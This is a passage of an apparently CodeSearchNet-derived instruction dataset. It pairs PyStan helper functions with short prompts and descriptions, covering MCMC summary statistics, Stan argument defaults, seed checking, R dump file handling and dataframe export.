else:\n            return str(num)\n    else:\n        return _format_number_si(num, n_signif_figures)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _summary(fit, pars=None, probs=None, **kwargs):\n    if fit.mode == 1:\n        msg = \"Stan model {} is of mode 'test_grad'; sampling is not conducted.\"\n        msg = msg.format(fit.model_name)\n        raise ValueError(msg)\n    elif fit.mode == 2:\n        msg = \"Stan model {} contains no samples.\".format(fit.model_name)\n        raise ValueError(msg)\n\n    if fit.sim['n_save'] == fit.sim['warmup2']:\n        msg = \"Stan model {} contains no samples.\".format(fit.model_name)\n        raise ValueError(msg)\n\n    # rstan checks for cached summaries here\n\n    if pars is None:\n        pars = fit.sim['pars_oi']\n    elif isinstance(pars, string_types):\n        pars = [pars]\n    pars = _remove_empty_pars(pars, fit.sim['pars_oi'], fit.sim['dims_oi'])\n\n    if probs is None:\n        probs = (0.025, 0.25, 0.5, 0.75, 0.975)\n    ss = _summary_sim(fit.sim, pars, probs)\n    # TODO: include sem, ess and rhat: ss['ess'], ss['rhat']\n    s1 = np.column_stack([ss['msd'][:, 0], ss['sem'], ss['msd'][:, 1], ss['quan'], ss['ess'], ss['rhat']])\n    s1_rownames = ss['c_msd_names']['parameters']\n    s1_colnames = ((ss['c_msd_names']['stats'][0],) + ('se_mean',) +\n                   (ss['c_msd_names']['stats'][1],) + ss['c_quan_names']['stats'] +\n                   ('n_eff', 'Rhat'))\n    s2 = _combine_msd_quan(ss['c_msd'], ss['c_quan'])\n    s2_rownames = ss['c_msd_names']['parameters']\n    s2_colnames = ss['c_msd_names']['stats'] + ss['c_quan_names']['stats']\n    return OrderedDict(summary=s1, c_summary=s2,\n                       summary_rownames=s1_rownames,\n                       summary_colnames=s1_colnames,\n                       c_summary_rownames=s2_rownames,\n                       c_summary_colnames=s2_colnames)", "response": "Summarize samples in all chains."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncombining msd and quan in chain summary", "response": "def _combine_msd_quan(msd, quan):\n    \"\"\"Combine msd and quantiles in chain summary\n\n    Parameters\n    ----------\n    msd : array of shape (num_params, 2, num_chains)\n       mean and sd for chains\n    cquan : array of shape (num_params, num_quan, num_chains)\n        quantiles for chains\n\n    Returns\n    -------\n    msdquan : array of shape (num_params, 2 + num_quan, num_chains)\n    \"\"\"\n    dim1 = msd.shape\n    n_par, _, n_chains = dim1\n    ll = []\n    for i in range(n_chains):\n        a1 = msd[:, :, i]\n        a2 = quan[:, :, i]\n        ll.append(np.column_stack([a1, a2]))\n    msdquan = np.dstack(ll)\n    return msdquan"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsummarizing chains together and separately with the specified parameters.", "response": "def _summary_sim(sim, pars, probs):\n    \"\"\"Summarize chains together and separately\n\n    REF: rstan/rstan/R/misc.R\n\n    Parameters are unraveled in *column-major order*.\n\n    Parameters\n    ----------\n    sim : dict\n        dict from from a stanfit fit object, i.e., fit['sim']\n    pars : Iterable of str\n        parameter names\n    probs : Iterable of probs\n        desired quantiles\n\n    Returns\n    -------\n    summaries : OrderedDict of array\n        This dictionary contains the following arrays indexed by the keys\n        given below:\n        - 'msd' : array of shape (num_params, 2) with mean and sd\n        - 'sem' : array of length num_params with standard error for the mean\n        - 'c_msd' : array of shape (num_params, 2, num_chains)\n        - 'quan' : array of shape (num_params, num_quan)\n        - 'c_quan' : array of shape (num_params, num_quan, num_chains)\n        - 'ess' : array of shape (num_params, 1)\n        - 'rhat' : array of shape (num_params, 1)\n\n    Note\n    ----\n    `_summary_sim` has the parameters in *column-major* order whereas `_summary`\n    gives them in *row-major* order. (This follows RStan.)\n    \"\"\"\n    # NOTE: this follows RStan rather closely. Some of the calculations here\n    probs_len = len(probs)\n    n_chains = len(sim['samples'])\n    # tidx is a dict with keys that are parameters and values that are their\n    # indices using column-major ordering\n    tidx = _pars_total_indexes(sim['pars_oi'], sim['dims_oi'], sim['fnames_oi'], pars)\n    tidx_colm = [tidx[par] for par in pars]\n    tidx_colm = list(itertools.chain(*tidx_colm))  # like R's unlist()\n    tidx_rowm = [tidx[par+'_rowmajor'] for par in pars]\n    tidx_rowm = list(itertools.chain(*tidx_rowm))\n    tidx_len = len(tidx_colm)\n    lmsdq = [_get_par_summary(sim, i, probs) for i in tidx_colm]\n    msd = np.row_stack([x['msd'] for x in lmsdq])\n    quan = np.row_stack([x['quan'] for x in lmsdq])\n    probs_str = tuple([\"{:g}%\".format(100*p) for p in probs])\n    msd.shape = (tidx_len, 2)\n    quan.shape = (tidx_len, probs_len)\n\n    c_msd = np.row_stack([x['c_msd'] for x in lmsdq])\n    c_quan = np.row_stack([x['c_quan'] for x in lmsdq])\n    c_msd.shape = (tidx_len, 2, n_chains)\n    c_quan.shape = (tidx_len, probs_len, n_chains)\n    sim_attr_args = sim.get('args', None)\n    if sim_attr_args is None:\n        cids = list(range(n_chains))\n    else:\n        cids = [x['chain_id'] for x in sim_attr_args]\n\n    c_msd_names = dict(parameters=np.asarray(sim['fnames_oi'])[tidx_colm],\n                       stats=(\"mean\", \"sd\"),\n                       chains=tuple(\"chain:{}\".format(cid) for cid in cids))\n    c_quan_names = dict(parameters=np.asarray(sim['fnames_oi'])[tidx_colm],\n                        stats=probs_str,\n                        chains=tuple(\"chain:{}\".format(cid) for cid in cids))\n    ess_and_rhat = np.array([pystan.chains.ess_and_splitrhat(sim, n) for n in tidx_colm])\n    ess, rhat = [arr.ravel() for arr in np.hsplit(ess_and_rhat, 2)]\n    return dict(msd=msd, c_msd=c_msd, c_msd_names=c_msd_names, quan=quan,\n                c_quan=c_quan, c_quan_names=c_quan_names,\n                sem=msd[:, 1] / np.sqrt(ess), ess=ess, rhat=rhat,\n                row_major_idx=tidx_rowm, col_major_idx=tidx_colm)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsummarizes chains merged and individually", "response": "def _get_par_summary(sim, n, probs):\n    \"\"\"Summarize chains merged and individually\n\n    Parameters\n    ----------\n    sim : dict from stanfit object\n    n : int\n        parameter index\n    probs : iterable of int\n        quantiles\n\n    Returns\n    -------\n    summary : dict\n       Dictionary containing summaries\n    \"\"\"\n    # _get_samples gets chains for nth parameter\n    ss = _get_samples(n, sim, inc_warmup=False)\n    msdfun = lambda chain: (np.mean(chain), np.std(chain, ddof=1))\n    qfun = lambda chain: mquantiles(chain, probs)\n    c_msd = np.array([msdfun(s) for s in ss]).flatten()\n    c_quan = np.array([qfun(s) for s in ss]).flatten()\n    ass = np.asarray(ss).flatten()\n    msd = np.asarray(msdfun(ass))\n    quan = qfun(np.asarray(ass))\n    return dict(msd=msd, quan=quan, c_msd=c_msd, c_quan=c_quan)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _get_valid_stan_args(base_args=None):\n    args = base_args.copy() if base_args is not None else {}\n    # Default arguments, c.f. rstan/rstan/inst/include/rstan/stan_args.hpp\n    # values in args are going to be converted into C++ objects so\n    # prepare them accordingly---e.g., unicode -> bytes -> std::string\n    args['chain_id'] = args.get('chain_id', 1)\n    args['append_samples'] = args.get('append_samples', False)\n    if args.get('method') is None or args['method'] == \"sampling\":\n        args['method'] = stan_args_method_t.SAMPLING\n    elif args['method'] == \"optim\":\n        args['method'] = stan_args_method_t.OPTIM\n    elif args['method'] == 'test_grad':\n        args['method'] = stan_args_method_t.TEST_GRADIENT\n    elif args['method'] == 'variational':\n        args['method'] = stan_args_method_t.VARIATIONAL\n    else:\n        args['method'] = stan_args_method_t.SAMPLING\n    args['sample_file_flag'] = True if args.get('sample_file') else False\n    args['sample_file'] = args.get('sample_file', '').encode('ascii')\n    args['diagnostic_file_flag'] = True if args.get('diagnostic_file') else False\n    args['diagnostic_file'] = args.get('diagnostic_file', '').encode('ascii')\n    # NB: argument named \"seed\" not \"random_seed\"\n    args['random_seed'] = args.get('seed', int(time.time()))\n\n    if args['method'] == stan_args_method_t.VARIATIONAL:\n        # variational does not use a `control` map like sampling\n        args['ctrl'] = args.get('ctrl', dict(variational=dict()))\n        args['ctrl']['variational']['iter'] = args.get('iter', 10000)\n        args['ctrl']['variational']['grad_samples'] = args.get('grad_samples', 1)\n        args['ctrl']['variational']['elbo_samples'] = args.get('elbo_samples', 100)\n        args['ctrl']['variational']['eval_elbo'] = args.get('eval_elbo', 100)\n        args['ctrl']['variational']['output_samples'] = args.get('output_samples', 1000)\n        args['ctrl']['variational']['adapt_iter'] = args.get('adapt_iter', 50)\n        args['ctrl']['variational']['eta'] = args.get('eta', 1.0)\n        args['ctrl']['variational']['adapt_engaged'] = args.get('adapt_engaged', True)\n        args['ctrl']['variational']['tol_rel_obj'] = args.get('tol_rel_obj', 0.01)\n        if args.get('algorithm', '').lower() == 'fullrank':\n            args['ctrl']['variational']['algorithm'] = variational_algo_t.FULLRANK\n        else:\n            args['ctrl']['variational']['algorithm'] = variational_algo_t.MEANFIELD\n    elif args['method'] == stan_args_method_t.SAMPLING:\n        args['ctrl'] = args.get('ctrl', dict(sampling=dict()))\n        args['ctrl']['sampling']['iter'] = iter = args.get('iter', 2000)\n        args['ctrl']['sampling']['warmup'] = warmup = args.get('warmup', iter // 2)\n        calculated_thin = iter - warmup // 1000\n        if calculated_thin < 1:\n            calculated_thin = 1\n        args['ctrl']['sampling']['thin'] = thin = args.get('thin', calculated_thin)\n        args['ctrl']['sampling']['save_warmup'] = True  # always True now\n        args['ctrl']['sampling']['iter_save_wo_warmup'] = iter_save_wo_warmup = 1 + (iter - warmup - 1) // thin\n        args['ctrl']['sampling']['iter_save'] = iter_save_wo_warmup + 1 + (warmup - 1) // thin\n        refresh = iter // 10 if iter >= 20 else 1\n        args['ctrl']['sampling']['refresh'] = args.get('refresh', refresh)\n\n        ctrl_lst = args.get('control', dict())\n        ctrl_sampling = args['ctrl']['sampling']\n        # NB: if these defaults change, remember to update docstrings\n        ctrl_sampling['adapt_engaged'] = ctrl_lst.get(\"adapt_engaged\", True)\n        ctrl_sampling['adapt_gamma'] = ctrl_lst.get(\"adapt_gamma\", 0.05)\n        ctrl_sampling['adapt_delta'] = ctrl_lst.get(\"adapt_delta\", 0.8)\n        ctrl_sampling['adapt_kappa'] = ctrl_lst.get(\"adapt_kappa\", 0.75)\n        ctrl_sampling['adapt_t0'] = ctrl_lst.get(\"adapt_t0\", 10.0)\n        ctrl_sampling['adapt_init_buffer'] = ctrl_lst.get(\"adapt_init_buffer\", 75)\n        ctrl_sampling['adapt_term_buffer'] = ctrl_lst.get(\"adapt_term_buffer\", 50)\n        ctrl_sampling['adapt_window'] = ctrl_lst.get(\"adapt_window\", 25)\n        ctrl_sampling['stepsize'] = ctrl_lst.get(\"stepsize\", 1.0)\n        ctrl_sampling['stepsize_jitter'] = ctrl_lst.get(\"stepsize_jitter\", 0.0)\n\n        algorithm = args.get('algorithm', 'NUTS')\n        if algorithm == 'HMC':\n            args['ctrl']['sampling']['algorithm'] = sampling_algo_t.HMC\n        elif algorithm == 'Metropolis':\n            args['ctrl']['sampling']['algorithm'] = sampling_algo_t.Metropolis\n        elif algorithm == 'NUTS':\n            args['ctrl']['sampling']['algorithm'] = sampling_algo_t.NUTS\n        elif algorithm == 'Fixed_param':\n            args['ctrl']['sampling']['algorithm'] = sampling_algo_t.Fixed_param\n            # TODO: Setting adapt_engaged to False solves the segfault reported\n            # in issue #200; find out why this hack is needed. RStan deals with\n            # the setting elsewhere.\n            ctrl_sampling['adapt_engaged'] = False\n        else:\n            msg = \"Invalid value for parameter algorithm (found {}; \" \\\n                \"require HMC, Metropolis, NUTS, or Fixed_param).\".format(algorithm)\n            raise ValueError(msg)\n\n        metric = ctrl_lst.get('metric', 'diag_e')\n        if metric == \"unit_e\":\n            ctrl_sampling['metric'] = sampling_metric_t.UNIT_E\n        elif metric == \"diag_e\":\n            ctrl_sampling['metric'] = sampling_metric_t.DIAG_E\n        elif metric == \"dense_e\":\n            ctrl_sampling['metric'] = sampling_metric_t.DENSE_E\n\n        if ctrl_sampling['algorithm'] == sampling_algo_t.NUTS:\n            ctrl_sampling['max_treedepth'] = ctrl_lst.get(\"max_treedepth\", 10)\n        elif ctrl_sampling['algorithm'] == sampling_algo_t.HMC:\n            ctrl_sampling['int_time'] = ctrl_lst.get('int_time', 6.283185307179586476925286766559005768e+00)\n        elif ctrl_sampling['algorithm'] == sampling_algo_t.Metropolis:\n            pass\n        elif ctrl_sampling['algorithm'] == sampling_algo_t.Fixed_param:\n            pass\n\n    elif args['method'] == stan_args_method_t.OPTIM:\n        args['ctrl'] = args.get('ctrl', dict(optim=dict()))\n        args['ctrl']['optim']['iter'] = iter = args.get('iter', 2000)\n        algorithm = args.get('algorithm', 'LBFGS')\n        if algorithm == \"BFGS\":\n            args['ctrl']['optim']['algorithm'] = optim_algo_t.BFGS\n        elif algorithm == \"Newton\":\n            args['ctrl']['optim']['algorithm'] = optim_algo_t.Newton\n        elif algorithm == \"LBFGS\":\n            args['ctrl']['optim']['algorithm'] = optim_algo_t.LBFGS\n        else:\n            msg = \"Invalid value for parameter algorithm (found {}; \" \\\n                  \"require (L)BFGS or Newton).\".format(algorithm)\n            raise ValueError(msg)\n        refresh = args['ctrl']['optim']['iter'] // 100\n        args['ctrl']['optim']['refresh'] = args.get('refresh', refresh)\n        if args['ctrl']['optim']['refresh'] < 1:\n            args['ctrl']['optim']['refresh'] = 1\n        args['ctrl']['optim']['init_alpha'] = args.get(\"init_alpha\", 0.001)\n        args['ctrl']['optim']['tol_obj'] = args.get(\"tol_obj\", 1e-12)\n        args['ctrl']['optim']['tol_grad'] = args.get(\"tol_grad\", 1e-8)\n        args['ctrl']['optim']['tol_param'] = args.get(\"tol_param\", 1e-8)\n        args['ctrl']['optim']['tol_rel_obj'] = args.get(\"tol_rel_obj\", 1e4)\n        args['ctrl']['optim']['tol_rel_grad'] = args.get(\"tol_rel_grad\", 1e7)\n        args['ctrl']['optim']['save_iterations'] = args.get(\"save_iterations\", True)\n        args['ctrl']['optim']['history_size'] = args.get(\"history_size\", 5)\n    elif args['method'] == stan_args_method_t.TEST_GRADIENT:\n        args['ctrl'] = args.get('ctrl', dict(test_grad=dict()))\n        args['ctrl']['test_grad']['epsilon'] = args.get(\"epsilon\", 1e-6)\n        args['ctrl']['test_grad']['error'] = args.get(\"error\", 1e-6)\n\n    init = args.get('init', \"random\")\n    if isinstance(init, string_types):\n        args['init'] = init.encode('ascii')\n    elif isinstance(init, dict):\n        args['init'] = \"user\".encode('ascii')\n        # while the name is 'init_list', it is a dict; the name comes from rstan,\n        # where list elements can have names\n        args['init_list'] = init\n    else:\n        args['init'] = \"random\".encode('ascii')\n\n    args['init_radius'] = args.get('init_r', 2.0)\n    if (args['init_radius'] <= 0):\n        args['init'] = b\"0\"\n\n    # 0 initialization requires init_radius = 0\n    if (args['init'] == b\"0\" or args['init'] == 0):\n        args['init_radius'] = 0.0\n\n    args['enable_random_init'] = args.get('enable_random_init', True)\n    # RStan calls validate_args() here\n    return args", "response": "Fill in default values for arguments not provided in base_args."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _check_seed(seed):\n    if isinstance(seed, (Number, string_types)):\n        try:\n            seed = int(seed)\n        except ValueError:\n            logger.warning(\"`seed` must be castable to an integer\")\n            seed = None\n        else:\n            if seed < 0:\n                logger.warning(\"`seed` may not be negative\")\n                seed = None\n            elif seed > MAX_UINT:\n                raise ValueError('`seed` is too large; max is {}'.format(MAX_UINT))\n    elif isinstance(seed, np.random.RandomState):\n        seed = seed.randint(0, MAX_UINT)\n    elif seed is not None:\n        logger.warning('`seed` has unexpected type')\n        seed = None\n\n    if seed is None:\n        seed = random.randint(0, MAX_UINT)\n\n    return seed", "response": "Check if seed is a valid form for Stan."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _organize_inits(inits, pars, dims):\n    try:\n        idx_of_lp = pars.index('lp__')\n        del pars[idx_of_lp]\n        del dims[idx_of_lp]\n    except ValueError:\n        pass\n    starts = _calc_starts(dims)\n    return [_par_vector2dict(init, pars, dims, starts) for init in inits]", "response": "Return a list of initial values for each chain."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncalculates starting indexes for the base of the .", "response": "def _calc_starts(dims):\n    \"\"\"Calculate starting indexes\n\n    Parameters\n    ----------\n    dims : list of list of int\n        from (via cython conversion) vector[vector[uint]] dims\n\n    Examples\n    --------\n    >>> _calc_starts([[8, 2], [5], [6, 2]])\n    [0, 16, 21]\n\n    \"\"\"\n    # NB: Python uses 0-indexing; R uses 1-indexing.\n    l = len(dims)\n    s = [np.prod(d) for d in dims]\n    starts = np.cumsum([0] + s)[0:l].tolist()\n    # coerce things into ints before returning\n    return [int(i) for i in starts]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _par_vector2dict(v, pars, dims, starts=None):\n    if starts is None:\n        starts = _calc_starts(dims)\n    d = OrderedDict()\n    for i in range(len(pars)):\n        l = int(np.prod(dims[i]))\n        start = starts[i]\n        end = start + l\n        y = np.asarray(v[start:end])\n        if len(dims[i]) > 1:\n            y = y.reshape(dims[i], order='F')  # 'F' = Fortran, column-major\n        d[pars[i]] = y.squeeze() if y.shape == (1,) else y\n    return d", "response": "Turn a vector of samples into an OrderedDict according to param dims."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn all the indexes for the parameters in the sequence of names.", "response": "def _pars_total_indexes(names, dims, fnames, pars):\n    \"\"\"Obtain all the indexes for parameters `pars` in the sequence of names.\n\n    `names` references variables that are in column-major order\n\n    Parameters\n    ----------\n    names : sequence of str\n        All the parameter names.\n    dim : sequence of list of int\n        Dimensions, in same order as `names`.\n    fnames : sequence of str\n        All the scalar parameter names\n    pars : sequence of str\n        The parameters of interest. It is assumed all elements in `pars` are in\n        `names`.\n\n    Returns\n    -------\n    indexes : OrderedDict of list of int\n        Dictionary uses parameter names as keys. Indexes are column-major order.\n        For each parameter there is also a key `par`+'_rowmajor' that stores the\n        row-major indexing.\n\n    Note\n    ----\n    Inside each parameter (vector or array), the sequence uses column-major\n    ordering. For example, if we have parameters alpha and beta, having\n    dimensions [2, 2] and [2, 3] respectively, the whole parameter sequence\n    is alpha[0,0], alpha[1,0], alpha[0, 1], alpha[1, 1], beta[0, 0],\n    beta[1, 0], beta[0, 1], beta[1, 1], beta[0, 2], beta[1, 2]. In short,\n    like R matrix(..., bycol=TRUE).\n\n    Example\n    -------\n    >>> pars_oi = ['mu', 'tau', 'eta', 'theta', 'lp__']\n    >>> dims_oi = [[], [], [8], [8], []]\n    >>> fnames_oi = ['mu', 'tau', 'eta[1]', 'eta[2]', 'eta[3]', 'eta[4]',\n    ... 'eta[5]', 'eta[6]', 'eta[7]', 'eta[8]', 'theta[1]', 'theta[2]',\n    ... 'theta[3]', 'theta[4]', 'theta[5]', 'theta[6]', 'theta[7]',\n    ... 'theta[8]', 'lp__']\n    >>> pars = ['mu', 'tau', 'eta', 'theta', 'lp__']\n    >>> _pars_total_indexes(pars_oi, dims_oi, fnames_oi, pars)\n    ... # doctest: +ELLIPSIS\n    OrderedDict([('mu', (0,)), ('tau', (1,)), ('eta', (2, 3, ...\n\n    \"\"\"\n    starts = _calc_starts(dims)\n\n    def par_total_indexes(par):\n        # if `par` is a scalar, it will match one of `fnames`\n        if par in fnames:\n            p = fnames.index(par)\n            idx = tuple([p])\n            return OrderedDict([(par, idx), (par+'_rowmajor', idx)])\n        else:\n            p = names.index(par)\n            idx = starts[p] + np.arange(np.prod(dims[p]))\n            idx_rowmajor = starts[p] + _idx_col2rowm(dims[p])\n        return OrderedDict([(par, tuple(idx)), (par+'_rowmajor', tuple(idx_rowmajor))])\n\n    indexes = OrderedDict()\n    for par in pars:\n        indexes.update(par_total_indexes(par))\n    return indexes"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate indexes to change from col - major to row - major ordering", "response": "def _idx_col2rowm(d):\n    \"\"\"Generate indexes to change from col-major to row-major ordering\"\"\"\n    if 0 == len(d):\n        return 1\n    if 1 == len(d):\n        return np.arange(d[0])\n    # order='F' indicates column-major ordering\n    idx = np.array(np.arange(np.prod(d))).reshape(d, order='F').T\n    return idx.flatten(order='F')"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _get_samples(n, sim, inc_warmup=True):\n    # NOTE: this is in stanfit-class.R in RStan (rather than misc.R)\n    \"\"\"Get chains for `n`th parameter.\n\n    Parameters\n    ----------\n    n : int\n    sim : dict\n        A dictionary tied to a StanFit4Model instance.\n\n    Returns\n    -------\n    chains : list of array\n        Each chain is an element in the list.\n\n    \"\"\"\n    return pystan._misc.get_samples(n, sim, inc_warmup)", "response": "Get samples for n th parameter."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nredirect stderr for subprocesses to null", "response": "def _redirect_stderr():\n    \"\"\"Redirect stderr for subprocesses to /dev/null\n\n    Silences copious compilation messages.\n\n    Returns\n    -------\n    orig_stderr : file descriptor\n        Copy of original stderr file descriptor\n    \"\"\"\n    sys.stderr.flush()\n    stderr_fileno = sys.stderr.fileno()\n    orig_stderr = os.dup(stderr_fileno)\n    devnull = os.open(os.devnull, os.O_WRONLY)\n    os.dup2(devnull, stderr_fileno)\n    os.close(devnull)\n    return orig_stderr"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns True if the stream object has a working fileno.", "response": "def _has_fileno(stream):\n    \"\"\"Returns whether the stream object seems to have a working fileno()\n\n    Tells whether _redirect_stderr is likely to work.\n\n    Parameters\n    ----------\n    stream : IO stream object\n\n    Returns\n    -------\n    has_fileno : bool\n        True if stream.fileno() exists and doesn't raise OSError or\n        UnsupportedOperation\n    \"\"\"\n    try:\n        stream.fileno()\n    except (AttributeError, OSError, IOError, io.UnsupportedOperation):\n        return False\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nchecking to see if file is writable use temporary file", "response": "def _writable_sample_file(file, warn=True, wfun=None):\n    \"\"\"Check to see if file is writable, if not use temporary file\"\"\"\n    if wfun is None:\n        wfun = lambda x, y: '\"{}\" is not writable; use \"{}\" instead'.format(x, y)\n    dir = os.path.dirname(file)\n    dir = os.getcwd() if dir == '' else dir\n    if os.access(dir, os.W_OK):\n        return file\n    else:\n        dir2 = tempfile.mkdtemp()\n        if warn:\n            logger.warning(wfun(dir, dir2))\n        return os.path.join(dir2, os.path.basename(file))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ndump a dictionary with model data into a file using the R dump format that Stan supports.", "response": "def stan_rdump(data, filename):\n    \"\"\"\n    Dump a dictionary with model data into a file using the R dump format that\n    Stan supports.\n\n    Parameters\n    ----------\n    data : dict\n    filename : str\n\n    \"\"\"\n    for name in data:\n        if not is_legal_stan_vname(name):\n            raise ValueError(\"Variable name {} is not allowed in Stan\".format(name))\n    with open(filename, 'w') as f:\n        f.write(_dict_to_rdump(data))"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconverts a R dump formatted value to NumPy equivalent.", "response": "def _rdump_value_to_numpy(s):\n    \"\"\"\n    Convert a R dump formatted value to Numpy equivalent\n\n    For example, \"c(1, 2)\" becomes ``array([1, 2])``\n\n    Only supports a few R data structures. Will not work with European decimal format.\n    \"\"\"\n    if \"structure\" in s:\n        vector_str, shape_str = re.findall(r'c\\([^\\)]+\\)', s)\n        shape = [int(d) for d in shape_str[2:-1].split(',')]\n        if '.' in vector_str:\n            arr = np.array([float(v) for v in vector_str[2:-1].split(',')])\n        else:\n            arr = np.array([int(v) for v in vector_str[2:-1].split(',')])\n        # 'F' = Fortran, column-major\n        arr = arr.reshape(shape, order='F')\n    elif \"c(\" in s:\n        if '.' in s:\n            arr = np.array([float(v) for v in s[2:-1].split(',')], order='F')\n        else:\n            arr = np.array([int(v) for v in s[2:-1].split(',')], order='F')\n    else:\n        arr = np.array(float(s) if '.' in s else int(s))\n    return arr"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nremoves empty parameters from the list of parameters.", "response": "def _remove_empty_pars(pars, pars_oi, dims_oi):\n    \"\"\"\n    Remove parameters that are actually empty. For example, the parameter\n    y would be removed with the following model code:\n\n        transformed data { int n; n <- 0; }\n        parameters { real y[n]; }\n\n    Parameters\n    ----------\n    pars: iterable of str\n    pars_oi: list of str\n    dims_oi: list of list of int\n\n    Returns\n    -------\n    pars_trimmed: list of str\n    \"\"\"\n    pars = list(pars)\n    for par, dim in zip(pars_oi, dims_oi):\n        if par in pars and np.prod(dim) == 0:\n            del pars[pars.index(par)]\n    return pars"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef read_rdump(filename):\n    contents = open(filename).read().strip()\n    names = [name.strip() for name in re.findall(r'^(\\w+) <-', contents, re.MULTILINE)]\n    values = [value.strip() for value in re.split('\\w+ +<-', contents) if value]\n    if len(values) != len(names):\n        raise ValueError(\"Unable to read file. Unable to pair variable name with value.\")\n    d = OrderedDict()\n    for name, value in zip(names, values):\n        d[name.strip()] = _rdump_value_to_numpy(value.strip())\n    return d", "response": "Read data formatted using the R dump format\n   "}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nextract samples as a pandas dataframe for different parameters.", "response": "def to_dataframe(fit, pars=None, permuted=False, dtypes=None, inc_warmup=False, diagnostics=True, header=True):\n    \"\"\"Extract samples as a pandas dataframe for different parameters.\n\n    Parameters\n    ----------\n    pars : {str, sequence of str}\n        parameter (or quantile) name(s).\n    permuted : bool\n        If True, returned samples are permuted.\n        If inc_warmup is True, warmup samples have negative order.\n    dtypes : dict\n        datatype of parameter(s).\n        If nothing is passed, float will be used for all parameters.\n    inc_warmup : bool\n        If True, warmup samples are kept; otherwise they are\n        discarded.\n    diagnostics : bool\n        If True, include hmc diagnostics in dataframe.\n    header : bool\n       If True, include header columns.\n\n    Returns\n    -------\n    df : pandas dataframe\n        Returned dataframe contains: [header_df]|[draws_df]|[diagnostics_df],\n        where all groups are optional.\n        To exclude draws_df use `pars=[]`.\n\n    \"\"\"\n    try:\n        import pandas as pd\n    except ImportError:\n        raise ImportError(\"Pandas module not found. You can install pandas with: pip install pandas\")\n\n    fit._verify_has_samples()\n    pars_original = pars\n    if pars is None:\n        pars = fit.sim['pars_oi']\n    elif isinstance(pars, string_types):\n        pars = [pars]\n    if pars:\n        pars = pystan.misc._remove_empty_pars(pars, fit.sim['pars_oi'], fit.sim['dims_oi'])\n        allpars = fit.sim['pars_oi'] + fit.sim['fnames_oi']\n        _check_pars(allpars, pars)\n\n    if dtypes is None:\n        dtypes = {}\n\n    n_kept = [s if inc_warmup else s-w for s, w in zip(fit.sim['n_save'], fit.sim['warmup2'])]\n    chains = len(fit.sim['samples'])\n\n    diagnostic_type = {'divergent__':int,\n                       'energy__':float,\n                       'treedepth__':int,\n                       'accept_stat__':float,\n                       'stepsize__':float,\n                       'n_leapfrog__':int}\n\n    header_dict = OrderedDict()\n    if header:\n        idx = np.concatenate([np.full(n_kept[chain], chain, dtype=int) for chain in range(chains)])\n        warmup = [np.zeros(n_kept[chain], dtype=np.int64) for chain in range(chains)]\n\n        if inc_warmup:\n            draw = []\n            for chain, w in zip(range(chains), fit.sim['warmup2']):\n                warmup[chain][:w] = 1\n                draw.append(np.arange(n_kept[chain], dtype=np.int64) - w)\n            draw = np.concatenate(draw)\n        else:\n            draw = np.concatenate([np.arange(n_kept[chain], dtype=np.int64) for chain in range(chains)])\n        warmup = np.concatenate(warmup)\n\n        header_dict = OrderedDict(zip(['chain', 'draw', 'warmup'], [idx, draw, warmup]))\n\n    if permuted:\n        if inc_warmup:\n            chain_permutation = []\n            chain_permutation_order = []\n            permutation = []\n            permutation_order = []\n            for chain, p, w in zip(range(chains), fit.sim['permutation'], fit.sim['warmup2']):\n                chain_permutation.append(list(range(-w, 0)) + p)\n                chain_permutation_order.append(list(range(-w, 0)) + list(np.argsort(p)))\n                permutation.append(sum(n_kept[:chain])+chain_permutation[-1]+w)\n                permutation_order.append(sum(n_kept[:chain])+chain_permutation_order[-1]+w)\n            chain_permutation = np.concatenate(chain_permutation)\n            chain_permutation_order = np.concatenate(chain_permutation_order)\n            permutation = np.concatenate(permutation)\n            permutation_order = np.concatenate(permutation_order)\n\n        else:\n            chain_permutation = np.concatenate(fit.sim['permutation'])\n            chain_permutation_order = np.concatenate([np.argsort(item) for item in fit.sim['permutation']])\n            permutation = np.concatenate([sum(n_kept[:chain])+p for chain, p in enumerate(fit.sim['permutation'])])\n            permutation_order = np.argsort(permutation)\n\n        header_dict[\"permutation\"] = permutation\n        header_dict[\"chain_permutation\"] = chain_permutation\n        header_dict[\"permutation_order\"] = permutation_order\n        header_dict[\"chain_permutation_order\"] = chain_permutation_order\n\n    if header:\n        header_df = pd.DataFrame.from_dict(header_dict)\n    else:\n        if permuted:\n            header_df = pd.DataFrame.from_dict({\"permutation_order\" : header_dict[\"permutation_order\"]})\n        else:\n            header_df = pd.DataFrame()\n\n    fnames_set = set(fit.sim['fnames_oi'])\n    pars_set = set(pars)\n    if pars_original is None or fnames_set == pars_set:\n        dfs = [pd.DataFrame.from_dict(pyholder.chains).iloc[-n:] for pyholder, n in zip(fit.sim['samples'], n_kept)]\n        df = pd.concat(dfs, axis=0, sort=False, ignore_index=True)\n        if dtypes:\n            if not fnames_set.issuperset(pars_set):\n                par_keys = OrderedDict([(par, []) for par in fit.sim['pars_oi']])\n                for key in fit.sim['fnames_oi']:\n                    par = key.split(\"[\")\n                    par = par[0]\n                    par_keys[par].append(key)\n\n            for par, dtype in dtypes.items():\n                if isinstance(dtype, (float, 